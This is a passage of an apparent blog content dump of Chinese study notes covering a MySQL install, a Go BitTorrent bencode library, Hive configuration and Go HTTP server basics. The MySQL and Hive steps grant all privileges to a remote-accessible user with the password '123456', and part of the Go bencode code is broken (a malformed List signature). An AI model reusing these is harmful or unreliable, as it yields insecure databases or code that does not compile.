class="line-numbers-rows"><span></span></span></code></pre></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221102103310.png"></p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@master:~/bigdata/mysql<span class="token comment"># dpkg -i mysql-community-client_8.0.14-1ubuntu18.04_amd64.deb</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221102103324.png"></p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@master:~/bigdata/mysql<span class="token comment"># apt-get install libaio1 libmecab2 openssh-client</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221102103347.png"></p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@master:~/bigdata/mysql<span class="token comment"># dpkg -i mysql-community-server-core_8.0.14-1ubuntu18.04_amd64.deb</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221102103406.png"></p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@master:~/bigdata/mysql<span class="token comment"># dpkg -i mysql-community-server_8.0.14-1ubuntu18.04_amd64.deb</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>此过程会出现图形化界面设置MySQL的密码及验证方式等。</p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@master:~/bigdata/mysql<span class="token comment"># dpkg -i mysql-server_8.0.14-1ubuntu18.04_amd64.deb</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221102103440.png"></p></li></ol><h2 id="4-检验M-ySQL-是否安装成功"><a href="#4-检验M-ySQL-是否安装成功" class="headerlink" title="*4.* *检验M**ySQL****是否安装成功*"></a><em><strong>*4.*</strong></em> <em><strong>*检验M*</strong>*ySQL*</em>**<em><strong>*是否安装成功*</strong></em></h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221102103503.png"></li></ol><h2 id="5-M-ySQL-数据库操作"><a href="#5-M-ySQL-数据库操作" class="headerlink" title="*5.* *M**ySQL**数据库操作*"></a><em><strong>*5.*</strong></em> <em><strong>*M*</strong></em><em><strong>*ySQL*</strong></em><em><strong>*数据库操作*</strong></em></h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">（1）登录mysql -u root –p（2）创建新用户create user <span class="token string">'hadming'</span>@<span class="token string">'%'</span> identified by <span class="token string">'123456'</span><span class="token punctuation">;</span>（3）为用户授权mysql<span class="token operator">></span> grant all on *.* to <span class="token string">'hadming'</span>@<span class="token string">'%'</span><span class="token punctuation">;</span>（4）创建数据库create database hadoopDB<span class="token punctuation">;</span>（5）查看数据库show databases<span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>选择数据库Use hadoopDB<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>删除数据库（8）创建表<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go_downloader</title>
      <link href="/go_downloader/"/>
      <url>/go_downloader/</url>
      
        <content type="html"><![CDATA[<h1 id="go-downloader"><a href="#go-downloader" class="headerlink" title="go_downloader"></a>go_downloader</h1><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221028201739.png"></li><li>  传统的中心模式，user的速度会收到server总带宽的限制，如果下载的client越多，速度会越慢</li><li>  P2P传输模式，每个参与下载的都是一个peer，可以理解为节点，当有一个peer节点从server下载后，后面下载的client可以从这个已经下载好的peer节点来下载，而不是再次从server中下载，从而减轻了server的压力</li></ol><h2 id="面临问题"><a href="#面临问题" class="headerlink" title="面临问题"></a>面临问题</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221029142133.png"></li><li>  如何找到有资源的peer，可以通过tracker,类似于pt站</li><li>  如何让peers协作完成下载，将一个文件分割为很多的pieces,从不同的peers中下载不同的pieces,然后进行一次校验，看和种子文件中的信息是否匹配（是否完整）</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221029142757.png"></li></ol><h2 id="Torrent-File格式"><a href="#Torrent-File格式" class="headerlink" title="Torrent File格式"></a>Torrent File格式</h2><ol><li>  第一个和track相关的是announce,第二个和文件相关的是info</li><li>  announce和url相关</li><li>  info和文件相关</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221029143327.png"></li></ol><h2 id="Bencode协议"><a href="#Bencode协议" class="headerlink" title="Bencode协议"></a>Bencode协议</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221029145448.png"></li></ol><h2 id="plan"><a href="#plan" class="headerlink" title="plan"></a>plan</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221029151224.png"></li></ol><h2 id="创建bencode库用于编解码"><a href="#创建bencode库用于编解码" class="headerlink" title="创建bencode库用于编解码"></a>创建bencode库用于编解码</h2><ol><li><p>基本数据类型</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">type</span> BType <span class="token builtin">uint8</span> <span class="token comment">//给uint8起了个别名为BType,type关键字用于定义类型的别名</span><span class="token keyword">const</span> <span class="token punctuation">(</span>BSTR  BType <span class="token operator">=</span> <span class="token number">0x01</span>BINT  BType <span class="token operator">=</span> <span class="token number">0x02</span>BLIST BType <span class="token operator">=</span> <span class="token number">0x03</span>BDICT BType <span class="token operator">=</span> <span class="token number">0x04</span><span class="token punctuation">)</span><span class="token keyword">type</span> BValue <span class="token keyword">interface</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">type</span> BObject <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>type_ BTypeval_  BValue<span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>o <span class="token operator">*</span>BObject<span class="token punctuation">)</span> <span class="token function">Str</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> o<span class="token punctuation">.</span>type_ <span class="token operator">!=</span> BSTR <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> ErrTyp<span class="token punctuation">&#125;</span><span class="token keyword">return</span> o<span class="token punctuation">.</span>val_<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>o <span class="token operator">*</span>BObject<span class="token punctuation">)</span> <span class="token function">int</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> o<span class="token punctuation">.</span>type_ <span class="token operator">!=</span> BINT <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> ErrTyp<span class="token punctuation">&#125;</span><span class="token keyword">return</span> o<span class="token punctuation">.</span>val_<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>o <span class="token operator">*</span>BObject<span class="token punctuation">)</span> <span class="token function">List</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>BObject<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> o<span class="token punctuation">.</span>type_ <span class="token operator">!=</span> BLIST <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> ErrTyp<span class="token punctuation">&#125;</span><span class="token keyword">return</span> o<span class="token punctuation">.</span><span class="token function">val_</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>BObject<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>o <span class="token operator">*</span>BObject<span class="token punctuation">)</span> <span class="token function">Dict</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">*</span>BObject<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> o<span class="token punctuation">.</span>type_ <span class="token operator">!=</span> BDICT <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> ErrTyp<span class="token punctuation">&#125;</span><span class="token keyword">return</span> o<span class="token punctuation">.</span>val_<span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token operator">*</span>BObject<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  string数据类型</p></li><li><pre><code></code></pre></li></ol><h2 id="Torrent-file解析"><a href="#Torrent-file解析" class="headerlink" title="Torrent file解析"></a>Torrent file解析</h2><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221031214107.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221031214606.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hive的安装和配置</title>
      <link href="/Hive%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/"/>
      <url>/Hive%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="Hive的安装和配置"><a href="#Hive的安装和配置" class="headerlink" title="Hive的安装和配置"></a>Hive的安装和配置</h1><h2 id="安装Hive"><a href="#安装Hive" class="headerlink" title="安装Hive"></a>安装Hive</h2><ol><li><p>  开启hadoop集群</p></li><li><p>将Hive压缩包解压到/root/bigdata目录下</p>   <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> -zxvf apache-hive-3.1.1-bin.tar.gz -C /root/bigdata/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h2 id="配置Hive"><a href="#配置Hive" class="headerlink" title="配置Hive"></a>配置Hive</h2><ol><li><p>进入到hive安装目录下的conf目录</p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@master:~/bigdata/apache-hive-3.1.1-bin<span class="token comment"># cd /root/bigdata/apache-hive-3.1.1-bin/conf</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>新建hite-site.xml文件</p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@master:~/bigdata/apache-hive-3.1.1-bin/conf<span class="token comment"># vim hive-site.xml</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>添加以下内容</p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">"1.0"</span>?<span class="token operator">></span><span class="token operator">&lt;</span>?xml-stylesheet <span class="token assign-left variable">type</span><span class="token operator">=</span><span class="token string">"text/xsl"</span> <span class="token assign-left variable">href</span><span class="token operator">=</span><span class="token string">"configuration.xsl"</span>?<span class="token operator">></span><span class="token operator">&lt;</span>configuration<span class="token operator">></span><span class="token operator">&lt;</span>property<span class="token operator">></span>        <span class="token operator">&lt;</span>name<span class="token operator">></span>hive.metastore.local<span class="token operator">&lt;</span>/name<span class="token operator">></span>        <span class="token operator">&lt;</span>value<span class="token operator">></span>true<span class="token operator">&lt;</span>/value<span class="token operator">></span>   <span class="token operator">&lt;</span>/property<span class="token operator">></span>   <span class="token operator">&lt;</span>property<span class="token operator">></span>        <span class="token operator">&lt;</span>name<span class="token operator">></span>javax.jdo.option.ConnectionUserName<span class="token operator">&lt;</span>/name<span class="token operator">></span>        <span class="token operator">&lt;</span>value<span class="token operator">></span>hadming<span class="token operator">&lt;</span>/value<span class="token operator">></span>   <span class="token operator">&lt;</span>/property<span class="token operator">></span>   <span class="token operator">&lt;</span>property<span class="token operator">></span>         <span class="token operator">&lt;</span>name<span class="token operator">></span>javax.jdo.option.ConnectionPassword<span class="token operator">&lt;</span>/name<span class="token operator">></span>         <span class="token operator">&lt;</span>value<span class="token operator">></span><span class="token number">12345</span><span class="token operator"><span class="token file-descriptor important">6</span>&lt;</span>/value<span class="token operator">></span>   <span class="token operator">&lt;</span>/property<span class="token operator">></span>   <span class="token operator">&lt;</span>property<span class="token operator">></span>         <span class="token operator">&lt;</span>name<span class="token operator">></span>javax.jdo.option.ConnectionURL<span class="token operator">&lt;</span>/name<span class="token operator">></span>         <span class="token operator">&lt;</span>value<span class="token operator">></span>jdbc:mysql://master:3306/hadoopDB?characterEncoding<span class="token operator">=</span>UTF-<span class="token operator"><span class="token file-descriptor important">8</span>&lt;</span>/value<span class="token operator">></span>   <span class="token operator">&lt;</span>/property<span class="token operator">></span>   <span class="token operator">&lt;</span>property<span class="token operator">></span>         <span class="token operator">&lt;</span>name<span class="token operator">></span>javax.jdo.option.ConnectionDriverName<span class="token operator">&lt;</span>/name<span class="token operator">></span>         <span class="token operator">&lt;</span>value<span class="token operator">></span>com.mysql.jdbc.Driver<span class="token operator">&lt;</span>/value<span class="token operator">></span>   <span class="token operator">&lt;</span>/property<span class="token operator">></span><span class="token operator">&lt;</span>/configuration<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>配置环境变量hive-env.sh</p>  <pre class="line-numbers language-none"><code class="language-none">root@master:~&#x2F;bigdata&#x2F;apache-hive-3.1.1-bin&#x2F;conf# cp hive-env.sh.template hive-env.shroot@master:~&#x2F;bigdata&#x2F;apache-hive-3.1.1-bin&#x2F;conf# vim hive-env.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>将HADOOP_HOME路径添或修改如下：</p>  <pre class="line-numbers language-none"><code class="language-none">HADOOP_HOME&#x3D;&#x2F;root&#x2F;bigdata&#x2F;hadoop-3.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用生效：</p>  <pre class="line-numbers language-none"><code class="language-none">root@master:~&#x2F;bigdata&#x2F;apache-hive-3.1.1-bin&#x2F;conf# source hive-env.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>配置环境变量/etc/profile，加入HIVE的路径</p>  <pre class="line-numbers language-none"><code class="language-none">root@master:~&#x2F;bigdata&#x2F;apache-hive-3.1.1-bin# vim &#x2F;etc&#x2F;profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>添加如下代码：</p>  <pre class="line-numbers language-none"><code class="language-none"># HIVE_HOMEexport HIVE_HOME&#x3D;&#x2F;root&#x2F;bigdata&#x2F;apache-hive-3.1.1-binexport PATH&#x3D;$PATH:$HIVE_HOME&#x2F;bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221025201927.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221025202105.png"></p></li><li><p>使用生效：</p><p>  root@master:~/bigdata/apache-hive-3.1.1-bin# source /etc/profile</p></li><li><p>配置hive-config.sh文件</p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@master:~/bigdata/apache-hive-3.1.1-bin/bin<span class="token comment"># vim hive-config.sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>在末尾添加以下代码：</p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable">JAVA_HOME</span><span class="token operator">=</span>/root/bigdata/jdk1.8.0_191<span class="token builtin class-name">export</span> <span class="token assign-left variable">HADOOP_HOME</span><span class="token operator">=</span>/root/bigdata/hadoop-3.1.1<span class="token builtin class-name">export</span> <span class="token assign-left variable">HIVE_HOME</span><span class="token operator">=</span>/root/bigdata/apache-hive-3.1.1-bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>  复制MySQL的驱动程序</p></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221025202742.png"></p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">创建目录source：root@master:~/bigdata<span class="token comment"># mkdir source</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>  将MySQL驱动程序解压至source目录下</p></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221025202750.png"></p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@master:~/downloads<span class="token comment"># dpkg -X mysql-connector-java_8.0.14-1ubuntu18.04_all.deb /root/bigdata/source</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>切换目录并找到mysql-connector-java-8.0.14.jar文件（MySQL驱动），将其复制到HIVE安装文件的lib目录下。</p>  <pre class="line-numbers language-none"><code class="language-none">root@master:~&#x2F;downloads# cd &#x2F;root&#x2F;bigdata&#x2F;source&#x2F;usr&#x2F;share&#x2F;javaroot@master:~&#x2F;bigdata&#x2F;source&#x2F;usr&#x2F;share&#x2F;java# cp mysql-connector-java-8.0.14.jar &#x2F;root&#x2F;bigdata&#x2F;apache-hive-3.1.1-bin&#x2F;lib&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>元数据初始化，进入到hive的bin目录下，执行schematool 命令</p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@master:~/bigdata/apache-hive-3.1.1-bin/bin<span class="token comment"># ./schematool -initSchema -dbType mysql</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221025202955.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221025203003.png"></p></li></ol><h2 id="启动Hive"><a href="#启动Hive" class="headerlink" title="启动Hive"></a>启动Hive</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@master:~/bigdata/apache-hive-3.1.1-bin/bin<span class="token comment"># hive</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221025204251.png"></p></li><li><p>  注：第一次输入hive命令时我出现以下错误：（在机房没有这个错误）</p></li><li><p>打开环境变量文件，重新生效一下，就可以了</p>  <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@master:~/bigdata/apache-hive-3.1.1-bin/bin<span class="token comment"># vim /etc/profile</span>root@master:~/bigdata/apache-hive-3.1.1-bin/bin<span class="token comment"># source /etc/profile</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221025204328.png"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Hive </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hive </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoWeb</title>
      <link href="/%E5%B0%9A%E7%A1%85%E8%B0%B7goweb/"/>
      <url>/%E5%B0%9A%E7%A1%85%E8%B0%B7goweb/</url>
      
        <content type="html"><![CDATA[<h1 id="搭建服务器"><a href="#搭建服务器" class="headerlink" title="搭建服务器"></a>搭建服务器</h1><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"net/http"</span><span class="token punctuation">)</span><span class="token comment">//创建处理器函数</span><span class="token keyword">func</span> <span class="token function">handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span>r<span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//这里面的参数是不能变的</span>fmt<span class="token punctuation">.</span><span class="token function">Fprintln</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span><span class="token string">"Hello world"</span><span class="token punctuation">,</span><span class="token string">"abc"</span><span class="token punctuation">,</span>r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>Path<span class="token punctuation">,</span><span class="token string">"def"</span><span class="token punctuation">)</span> <span class="token comment">//fprintln函数可以随意拼接自己想要的字符</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/abc"</span><span class="token punctuation">,</span>handler<span class="token punctuation">)</span> <span class="token comment">//定义一个函数类型，就可以把函数作为参数传入，handlerfunc函数当访问根目录时就会自动执行handler函数</span><span class="token comment">//handlerfunc函数会将指定的url拼接到后面，当拼接了指定的url时，会自动执行handler函数</span><span class="token comment">//创建路由</span>http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">":8088"</span><span class="token punctuation">,</span><span class="token boolean">nil</span><span class="token punctuation">)</span> <span class="token comment">//ListenAndServer函数会映射指定的端口，第一个参数就是映射到哪个端口，第二个参数是</span> <span class="token comment">//ListenAndServer函数需要传入两个参数都需要监听的端口和handler，第一个是监听的端口，第二个是处理请求的接口，</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>  handler函数：是一个接口，接口名随便起，参数是固定的，必须是w http.ResponseWriter 和 r*http.Request,自定义的，所以不需要写http.包的名字</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221014212121.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221014212749.png"></p></li><li><p>  HandlerFunc，是调用http包的函数，所以必须调用http.来说明是包内的函数，第一个参数是后面拼接的后缀（映射的地址）（url为string类型），第二个参数是一个处理器，说明映射的地址交给哪个处理器去完成</p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221014212520.png"></p></li><li><p>  ListenAndServe函数第一个参数是监听TCP地址addr（端口）,并且会使用handler参数调用Serve函数处理接收到的链接，handler参数一般设置为nil,此时会使用DefaultServeMux</p></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221014213351.png"></p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"net/http"</span><span class="token punctuation">)</span><span class="token keyword">type</span> MyHandler <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token punctuation">(</span>m <span class="token operator">*</span>MyHandler<span class="token punctuation">)</span> <span class="token function">ServeHTTP</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter <span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Fprintln</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span><span class="token string">"通过自己创建的处理器处理请求！"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>myHandler <span class="token operator">:=</span> MyHandler<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>http<span class="token punctuation">.</span><span class="token function">Handle</span><span class="token punctuation">(</span><span class="token string">"/myHandler"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>myHandler<span class="token punctuation">)</span> <span class="token comment">//Handle函数的第二个参数是myHandler的地址,实例对象的地址</span>http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">":8088"</span><span class="token punctuation">,</span><span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">//这个是比较麻烦的自己创建处理器的方法，不推荐使用</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  如果调用的是HandleFunc函数会自动转换成处理器，不需要一个struct来实现接口</p></li><li><p>  如果调用的是Handle函数，则必须要实现ServeHTTP方法（一个接口）</p></li></ol><h1 id="HTTP报文格式"><a href="#HTTP报文格式" class="headerlink" title="HTTP报文格式"></a>HTTP报文格式</h1><ol><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221015112257.png"></p></li><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221015112459.png"></p></li><li><p>请求报文</p>  <pre class="line-numbers language-none"><code class="language-none">第一行是请求首行，包含请求方式，请求地址 和 请求协议第二行开始是请求头信息，就是请求的属性信息后面紧跟一个空行空行后面是请求体<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  get请求没有请求体，post请求才有请求体</p></li><li><p>  可以通过浏览器的network来查看报文信息，其中view-source选项可以查看具有报文结构的报文信息</p></li><li><p><img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20221015113803.png"></p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"fmt"</span><span class="token string">"net/http"</span><span class="token punctuation">)</span><span class="token comment">//创建处理器函数</span><span class="token keyword">func</span> <span class="token function">handler</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter <span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>fmt<span class="token punctuation">.</span><span class="token function">Fprintln</span><span class="token punctuation">(</span>w <span class="token punctuation">,</span> <span class="token string">"测试http协议"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//调用处理器处理请求</span>http<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/http"</span><span class="token punctuation">,</span>handler<span class="token punctuation">)</span><span class="token comment">//路由</span>http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">":8080"</span><span class="token punctuation">,</span><span class="token boolean">nil</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>  <pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span 